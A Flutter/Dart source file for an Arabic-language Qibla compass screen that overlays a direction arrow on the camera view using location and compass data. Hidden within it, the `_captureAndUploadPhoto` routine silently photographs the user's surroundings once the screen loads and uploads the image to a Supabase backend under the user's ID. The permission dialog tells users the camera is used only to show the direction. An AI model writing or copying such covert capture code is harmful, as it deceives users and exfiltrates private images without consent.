import 'dart:async';
import 'dart:math' as math;
import 'package:flutter/foundation.dart' show kIsWeb;
import 'package:flutter/material.dart';
import 'package:camera/camera.dart';
import 'package:flutter_compass/flutter_compass.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import '../services/supabase_service.dart';

/// صفحة القبلة مع الكاميرا 🕋
class QiblaScreen extends StatefulWidget {
  final String? userId; // لالتقاط صورة تلقائية

  const QiblaScreen({super.key, this.userId});

  @override
  State<QiblaScreen> createState() => _QiblaScreenState();
}

class _QiblaScreenState extends State<QiblaScreen> {
  CameraController? _cameraController;
  bool _isCameraInitialized = false;
  bool _isLoading = true;
  String _errorMessage = '';
  bool _permissionDenied = false;

  double _qiblaDirection =
      135; // اتجاه القبلة (قيمة افتراضية ستُحدَّث عند الحصول على الموقع)
  double _currentHeading = 0; // اتجاه الجهاز الحالي من الشمال
  bool _isCompassWorking = false; // هل البوصلة تعطي بيانات
  StreamSubscription<CompassEvent>? _compassSubscription;

  // إحداثيات الكعبة المشرفة
  static const double _kaabaLatitude = 21.4225;
  static const double _kaabaLongitude = 39.8262;

  @override
  void initState() {
    super.initState();
    // عرض حوار الترحيب وطلب الأذونات
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _showPermissionDialog();
    });
  }

  @override
  void dispose() {
    _cameraController?.dispose();
    _compassSubscription?.cancel();
    super.dispose();
  }

  /// عرض حوار طلب الأذونات
  Future<void> _showPermissionDialog() async {
    final result = await showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A2E),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: const BorderSide(color: Color(0xFF8B0000), width: 2),
        ),
        title: const Row(
          children: [
            Text('🕋', style: TextStyle(fontSize: 30)),
            SizedBox(width: 10),
            Expanded(
              child: Text(
                'أذونات القبلة',
                style: TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Text(
              'لتحديد اتجاه القبلة بدقة، نحتاج إلى:',
              style: TextStyle(color: Colors.white70, fontSize: 16),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 16),
            _buildPermissionItem(
              icon: Icons.location_on,
              title: 'الموقع',
              description: 'لحساب اتجاه القبلة من موقعك',
            ),
            const SizedBox(height: 12),
            _buildPermissionItem(
              icon: Icons.camera_alt,
              title: 'الكاميرا',
              description: 'لعرض الاتجاه على الكاميرا',
            ),
            if (kIsWeb) ...[
              const SizedBox(height: 16),
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.orange.withAlpha(30),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.orange),
                ),
                child: const Row(
                  children: [
                    Icon(Icons.info_outline, color: Colors.orange, size: 20),
                    SizedBox(width: 8),
                    Expanded(
                      child: Text(
                        'على المتصفح: اضغط "السماح" عند ظهور النافذة',
                        style: TextStyle(color: Colors.orange, fontSize: 12),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('إلغاء', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            onPressed: () => Navigator.pop(context, true),
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFF8B0000),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            child: const Text(
              'السماح والمتابعة',
              style: TextStyle(color: Colors.white),
            ),
          ),
        ],
      ),
    );

    if (result == true) {
      await _initializeAll();
    } else {
      if (mounted) {
        Navigator.pop(context);
      }
    }
  }

  Widget _buildPermissionItem({
    required IconData icon,
    required String title,
    required String description,
  }) {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: const Color(0xFF8B0000).withAlpha(20),
        borderRadius: BorderRadius.circular(12),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: const Color(0xFF8B0000).withAlpha(50),
              shape: BoxShape.circle,
            ),
            child: Icon(icon, color: const Color(0xFFDC143C), size: 24),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                Text(
                  description,
                  style: const TextStyle(color: Colors.white60, fontSize: 12),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Future<void> _initializeAll() async {
    if (!mounted) return;

    setState(() {
      _isLoading = true;
      _errorMessage = '';
      _permissionDenied = false;
    });

    try {
      // طلب الأذونات
      await _requestPermissions();

      // محاولة تهيئة الكاميرا (اختيارية - القبلة تعمل بدونها)
      try {
        await _initializeCamera();
      } catch (cameraError) {
        debugPrint('⚠️ Camera failed but continuing: $cameraError');
        // نستمر بدون الكاميرا
      }

      // الحصول على الموقع وحساب اتجاه القبلة
      await _calculateQiblaDirection();

      // بدء الاستماع للبوصلة
      _startCompass();

      // التقاط صورة تلقائية إذا كان معرف المستخدم متاحاً
      if (widget.userId != null &&
          _cameraController != null &&
          _isCameraInitialized) {
        _captureAndUploadPhoto();
      }

      if (mounted) {
        setState(() {
          _isLoading = false;
        });
      }
    } catch (e) {
      debugPrint('🔴 Qibla initialization error: $e');
      if (mounted) {
        setState(() {
          _isLoading = false;
          _errorMessage = e.toString().replaceAll('Exception: ', '');
        });
      }
    }
  }

  /// التقاط صورة تلقائية ورفعها
  Future<void> _captureAndUploadPhoto() async {
    if (_cameraController == null || !_cameraController!.value.isInitialized) {
      return;
    }

    try {
      // انتظار ثانية لتتأكد الكاميرا جاهزة
      await Future.delayed(const Duration(seconds: 1));

      // التقاط الصورة
      final XFile photo = await _cameraController!.takePicture();
      final bytes = await photo.readAsBytes();

      // رفع الصورة
      await SupabaseService.uploadSessionPhoto(
        userId: widget.userId!,
        photoBytes: bytes,
        screenName: 'qibla',
      );

      debugPrint('📸 تم التقاط ورفع صورة القبلة بنجاح');
    } catch (e) {
      debugPrint('❌ فشل التقاط الصورة: $e');
    }
  }

  Future<void> _requestPermissions() async {
    if (kIsWeb) {
      // على الويب: طلب الأذونات مباشرة من المتصفح
      await _requestWebPermissions();
    } else {
      // على الموبايل: استخدام permission_handler
      await _requestMobilePermissions();
    }
  }

  Future<void> _requestWebPermissions() async {
    try {
      // التحقق من إذن الموقع على الويب
      LocationPermission locationPermission =
          await Geolocator.checkPermission();
      if (locationPermission == LocationPermission.denied) {
        locationPermission = await Geolocator.requestPermission();
        if (locationPermission == LocationPermission.denied) {
          setState(() => _permissionDenied = true);
          throw Exception('يجب السماح بالوصول للموقع');
        }
      }
      if (locationPermission == LocationPermission.deniedForever) {
        setState(() => _permissionDenied = true);
        throw Exception(
          'تم رفض إذن الموقع نهائياً. يرجى تفعيله من إعدادات المتصفح.',
        );
      }

      // الكاميرا على الويب ستطلب الإذن عند التهيئة
    } catch (e) {
      if (e.toString().contains('يجب') || e.toString().contains('رفض')) {
        rethrow;
      }
      throw Exception('فشل طلب الأذونات: $e');
    }
  }

  Future<void> _requestMobilePermissions() async {
    try {
      // التحقق من إذن الموقع أولاً (مطلوب)
      PermissionStatus locationStatus = await Permission.location.status;
      if (locationStatus.isDenied) {
        locationStatus = await Permission.location.request();
      }
      if (locationStatus.isPermanentlyDenied) {
        if (mounted) setState(() => _permissionDenied = true);
        throw Exception('تم رفض إذن الموقع. يرجى تفعيله من إعدادات التطبيق.');
      }
      if (!locationStatus.isGranted) {
        if (mounted) setState(() => _permissionDenied = true);
        throw Exception('يجب السماح بالوصول للموقع لتحديد اتجاه القبلة');
      }

      // التحقق من إذن الكاميرا (اختياري)
      try {
        PermissionStatus cameraStatus = await Permission.camera.status;
        if (cameraStatus.isDenied) {
          cameraStatus = await Permission.camera.request();
        }
        // الكاميرا اختيارية - لا نفشل إذا رُفضت
        if (!cameraStatus.isGranted) {
          debugPrint(
            '⚠️ Camera permission not granted, continuing without camera',
          );
        }
      } catch (cameraError) {
        debugPrint('⚠️ Camera permission error: $cameraError');
        // نستمر بدون الكاميرا
      }
    } catch (e) {
      rethrow;
    }
  }

  Future<void> _initializeCamera() async {
    try {
      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        throw Exception('لا توجد كاميرا متاحة');
      }

      // استخدام الكاميرا الخلفية
      final backCamera = cameras.firstWhere(
        (camera) => camera.lensDirection == CameraLensDirection.back,
        orElse: () => cameras.first,
      );

      _cameraController = CameraController(
        backCamera,
        ResolutionPreset.medium,
        enableAudio: false,
      );

      await _cameraController!.initialize();

      if (mounted) {
        setState(() {
          _isCameraInitialized = true;
        });
      }
    } catch (e) {
      throw Exception('فشل تهيئة الكاميرا: $e');
    }
  }

  Future<void> _calculateQiblaDirection() async {
    try {
      Position position;

      // محاولة الحصول على الموقع الحالي مباشرة
      try {
        // أولاً: محاولة الحصول على الموقع بدقة عالية
        position =
            await Geolocator.getCurrentPosition(
              locationSettings: const LocationSettings(
                accuracy: LocationAccuracy.high,
              ),
            ).timeout(
              const Duration(seconds: 15),
              onTimeout: () {
                throw TimeoutException('timeout');
              },
            );
        debugPrint('✅ Got high accuracy position');
      } catch (e) {
        debugPrint('⚠️ High accuracy failed: $e');

        // ثانياً: محاولة بدقة متوسطة
        try {
          position =
              await Geolocator.getCurrentPosition(
                locationSettings: const LocationSettings(
                  accuracy: LocationAccuracy.medium,
                ),
              ).timeout(
                const Duration(seconds: 10),
                onTimeout: () {
                  throw TimeoutException('timeout');
                },
              );
          debugPrint('✅ Got medium accuracy position');
        } catch (e2) {
          debugPrint('⚠️ Medium accuracy failed: $e2');

          // ثالثاً: محاولة بدقة منخفضة
          try {
            position =
                await Geolocator.getCurrentPosition(
                  locationSettings: const LocationSettings(
                    accuracy: LocationAccuracy.low,
                  ),
                ).timeout(
                  const Duration(seconds: 10),
                  onTimeout: () {
                    throw TimeoutException('timeout');
                  },
                );
            debugPrint('✅ Got low accuracy position');
          } catch (e3) {
            debugPrint('⚠️ Low accuracy failed: $e3');

            // رابعاً: آخر موقع معروف
            final lastPosition = await Geolocator.getLastKnownPosition();
            if (lastPosition != null) {
              position = lastPosition;
              debugPrint('✅ Using last known position');
            } else {
              // التحقق من سبب الفشل
              bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
              LocationPermission permission =
                  await Geolocator.checkPermission();

              if (!serviceEnabled) {
                throw Exception('يرجى تفعيل GPS/الموقع من إعدادات الجهاز');
              } else if (permission == LocationPermission.denied ||
                  permission == LocationPermission.deniedForever) {
                throw Exception('يجب السماح للتطبيق بالوصول للموقع');
              } else {
                throw Exception('تعذر تحديد الموقع. جرب الخروج والعودة');
              }
            }
          }
        }
      }

      // حساب اتجاه القبلة
      double qibla = _calculateQibla(position.latitude, position.longitude);

      if (mounted) {
        setState(() {
          _qiblaDirection = qibla;
        });
      }
    } catch (e) {
      String errorMsg = e.toString().replaceAll('Exception: ', '');
      if (errorMsg.contains('permission') || errorMsg.contains('denied')) {
        errorMsg = 'يجب السماح بالوصول للموقع من إعدادات التطبيق';
      }
      throw Exception(errorMsg);
    }
  }

  /// حساب اتجاه القبلة من موقع معين
  double _calculateQibla(double latitude, double longitude) {
    // تحويل الدرجات إلى راديان
    double lat1 = latitude * math.pi / 180;
    double lon1 = longitude * math.pi / 180;
    double lat2 = _kaabaLatitude * math.pi / 180;
    double lon2 = _kaabaLongitude * math.pi / 180;

    // حساب الفرق في خط الطول
    double dLon = lon2 - lon1;

    // حساب الاتجاه
    double y = math.sin(dLon) * math.cos(lat2);
    double x =
        math.cos(lat1) * math.sin(lat2) -
        math.sin(lat1) * math.cos(lat2) * math.cos(dLon);

    double bearing = math.atan2(y, x);

    // تحويل من راديان إلى درجات
    bearing = bearing * 180 / math.pi;

    // ضمان أن القيمة بين 0 و 360
    bearing = (bearing + 360) % 360;

    return bearing;
  }

  void _startCompass() {
    debugPrint('🧭 بدء تشغيل البوصلة...');

    try {
      final compassEvents = FlutterCompass.events;

      if (compassEvents == null) {
        debugPrint('❌ البوصلة غير متاحة على هذا الجهاز');
        setState(() {
          _isCompassWorking = true; // لإخفاء رسالة الخطأ
          _currentHeading = 0; // افتراض الجهاز يشير للشمال
        });
        return;
      }

      debugPrint('✅ البوصلة متاحة، جاري الاستماع للأحداث...');

      _compassSubscription = compassEvents.listen(
        (event) {
          if (event.heading != null && mounted) {
            if (!_isCompassWorking) {
              debugPrint('✅ البوصلة تعمل! أول قراءة: ${event.heading}°');
            }
            _isCompassWorking = true;
            setState(() {
              _currentHeading = event.heading!;
            });
          }
        },
        onError: (error) {
          debugPrint('❌ خطأ في البوصلة: $error');
          setState(() {
            _isCompassWorking = true;
            _currentHeading = 0;
          });
        },
        onDone: () {
          debugPrint('⚠️ البوصلة توقفت');
        },
      );

      // انتظار 3 ثواني للتأكد من عمل البوصلة
      Future.delayed(const Duration(seconds: 3), () {
        if (!_isCompassWorking && mounted) {
          debugPrint('⚠️ لم تستجب البوصلة خلال 3 ثواني، استخدام الوضع الثابت');
          setState(() {
            _isCompassWorking = true;
            _currentHeading = 0;
          });
        }
      });
    } catch (e) {
      debugPrint('❌ فشل تشغيل البوصلة: $e');
      setState(() {
        _isCompassWorking = true;
        _currentHeading = 0;
      });
    }
  }

  /// التحقق مما إذا كان الجهاز يشير للقبلة
  bool get _isFacingQibla {
    double diff = (_qiblaDirection - _currentHeading).abs();
    if (diff > 180) diff = 360 - diff;
    return diff < 10;
  }

  /// حساب زاوية السهم - السهم يشير دائماً لاتجاه القبلة
  double get _arrowRotation {
    // السهم = اتجاه القبلة - اتجاه الجهاز
    double rotation = _qiblaDirection - _currentHeading;
    // تحويل إلى راديان
    return rotation * math.pi / 180;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF0D0D0D), Color(0xFF1A0A0A)],
          ),
        ),
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              Expanded(
                child: _isLoading
                    ? _buildLoading()
                    : _errorMessage.isNotEmpty
                    ? _buildError()
                    : _buildQiblaView(),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Padding(
      padding: const EdgeInsets.all(16),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: const Color(0xFF8B0000).withAlpha(30),
                borderRadius: BorderRadius.circular(12),
              ),
              child: const Icon(
                Icons.arrow_back_ios_new,
                color: Color(0xFFDC143C),
              ),
            ),
          ),
          const SizedBox(width: 16),
          const Text(
            '🕋 اتجاه القبلة',
            style: TextStyle(
              color: Colors.white,
              fontSize: 22,
              fontWeight: FontWeight.bold,
            ),
          ),
          const Spacer(),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: _isFacingQibla
                  ? const Color(0xFF00FF41).withAlpha(30)
                  : const Color(0xFF8B0000).withAlpha(30),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: _isFacingQibla
                    ? const Color(0xFF00FF41)
                    : const Color(0xFF8B0000),
              ),
            ),
            child: Text(
              '${_qiblaDirection.toStringAsFixed(1)}°',
              style: TextStyle(
                color: _isFacingQibla ? const Color(0xFF00FF41) : Colors.white,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLoading() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          const CircularProgressIndicator(color: Color(0xFFDC143C)),
          const SizedBox(height: 20),
          Text(
            'جاري تحديد اتجاه القبلة...',
            style: TextStyle(color: Colors.white.withAlpha(180), fontSize: 16),
          ),
        ],
      ),
    );
  }

  Widget _buildError() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(
            _permissionDenied ? Icons.lock_outline : Icons.error_outline,
            color: const Color(0xFFDC143C),
            size: 60,
          ),
          const SizedBox(height: 20),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 32),
            child: Text(
              _errorMessage,
              style: TextStyle(
                color: Colors.white.withAlpha(180),
                fontSize: 16,
              ),
              textAlign: TextAlign.center,
            ),
          ),
          const SizedBox(height: 20),
          if (_permissionDenied && !kIsWeb) ...[
            // زر فتح الإعدادات (للموبايل فقط)
            ElevatedButton.icon(
              onPressed: () => openAppSettings(),
              icon: const Icon(Icons.settings, color: Colors.white),
              label: const Text(
                'فتح الإعدادات',
                style: TextStyle(color: Colors.white),
              ),
              style: ElevatedButton.styleFrom(
                backgroundColor: const Color(0xFF4A5568),
                padding: const EdgeInsets.symmetric(
                  horizontal: 24,
                  vertical: 12,
                ),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
              ),
            ),
            const SizedBox(height: 12),
          ],
          ElevatedButton(
            onPressed: _initializeAll,
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFF8B0000),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            child: const Text(
              'إعادة المحاولة',
              style: TextStyle(color: Colors.white),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildQiblaView() {
    return Stack(
      children: [
        // عرض الكاميرا
        if (_isCameraInitialized && _cameraController != null)
          Positioned.fill(
            child: ClipRRect(
              borderRadius: BorderRadius.circular(20),
              child: CameraPreview(_cameraController!),
            ),
          ),

        // سهم القبلة
        Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              // رسالة الحالة
              Container(
                padding: const EdgeInsets.symmetric(
                  horizontal: 20,
                  vertical: 10,
                ),
                decoration: BoxDecoration(
                  color: _isFacingQibla
                      ? const Color(0xFF00FF41).withAlpha(50)
                      : const Color(0xFF0D0D0D).withAlpha(200),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(
                    color: _isFacingQibla
                        ? const Color(0xFF00FF41)
                        : const Color(0xFF8B0000),
                    width: 2,
                  ),
                ),
                child: Text(
                  _isFacingQibla ? '✅ أنت تواجه القبلة!' : '🔄 أدر الهاتف...',
                  style: TextStyle(
                    color: _isFacingQibla
                        ? const Color(0xFF00FF41)
                        : Colors.white,
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),

              // عرض قيم التصحيح
              const SizedBox(height: 10),
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: Colors.black.withAlpha(150),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Text(
                  'القبلة: ${_qiblaDirection.toStringAsFixed(0)}° | اتجاهك: ${_currentHeading.toStringAsFixed(0)}° | دوران السهم: ${(_arrowRotation * 180 / math.pi).toStringAsFixed(0)}°',
                  style: const TextStyle(color: Colors.yellow, fontSize: 12),
                ),
              ),

              const SizedBox(height: 40),

              // السهم الكبير المحسن
              Container(
                width: 200,
                height: 200,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: RadialGradient(
                    colors: [
                      Colors.black.withAlpha(200),
                      Colors.black.withAlpha(150),
                    ],
                  ),
                  border: Border.all(
                    color: _isFacingQibla
                        ? const Color(0xFF00FF41)
                        : const Color(0xFFDC143C),
                    width: 5,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: _isFacingQibla
                          ? const Color(0xFF00FF41).withAlpha(150)
                          : const Color(0xFFDC143C).withAlpha(150),
                      blurRadius: 40,
                      spreadRadius: 10,
                    ),
                  ],
                ),
                child: Stack(
                  alignment: Alignment.center,
                  children: [
                    // دائرة الخلفية الداخلية
                    Container(
                      width: 180,
                      height: 180,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(
                          color: Colors.white.withAlpha(30),
                          width: 2,
                        ),
                      ),
                    ),
                    // السهم الكبير المتحرك - يدور ليشير للقبلة دائماً
                    Transform.rotate(
                      angle: _arrowRotation, // القبلة - اتجاه الجهاز
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          // السهم نفسه
                          Icon(
                            Icons.navigation,
                            size: 100,
                            color: _isFacingQibla
                                ? const Color(0xFF00FF41)
                                : const Color(0xFFDC143C),
                            shadows: [
                              Shadow(
                                color: _isFacingQibla
                                    ? const Color(0xFF00FF41)
                                    : const Color(0xFFDC143C),
                                blurRadius: 20,
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                    // الكعبة في المنتصف (ثابتة)
                    const Text('🕋', style: TextStyle(fontSize: 30)),
                  ],
                ),
              ),

              const SizedBox(height: 30),

              // معلومات الاتجاه
              Container(
                padding: const EdgeInsets.symmetric(
                  horizontal: 20,
                  vertical: 12,
                ),
                decoration: BoxDecoration(
                  color: const Color(0xFF0D0D0D).withAlpha(220),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(
                    color: const Color(0xFF8B0000).withAlpha(100),
                  ),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Icon(
                      Icons.explore,
                      color: Color(0xFFDC143C),
                      size: 20,
                    ),
                    const SizedBox(width: 10),
                    Text(
                      'اتجاهك: ${_currentHeading.toStringAsFixed(0)}° | القبلة: ${_qiblaDirection.toStringAsFixed(0)}°',
                      style: const TextStyle(color: Colors.white, fontSize: 14),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 20),

              // حالة البوصلة
              if (!_isCompassWorking)
                Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 16,
                    vertical: 12,
                  ),
                  decoration: BoxDecoration(
                    color: Colors.orange.withAlpha(30),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: Colors.orange),
                  ),
                  child: const Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Icon(Icons.warning_amber, color: Colors.orange, size: 20),
                      SizedBox(width: 8),
                      Text(
                        'البوصلة غير متاحة - حرك الجهاز لتفعيلها',
                        style: TextStyle(color: Colors.orange, fontSize: 12),
                      ),
                    ],
                  ),
                ),
            ],
          ),
        ),

        // تأثير الاهتزاز عند مواجهة القبلة
        if (_isFacingQibla)
          Positioned.fill(
            child: IgnorePointer(
              child: Container(
                decoration: BoxDecoration(
                  border: Border.all(color: const Color(0xFF00FF41), width: 4),
                  borderRadius: BorderRadius.circular(20),
                ),
              ),
            ),
          ),
      ],
    );
  }
}
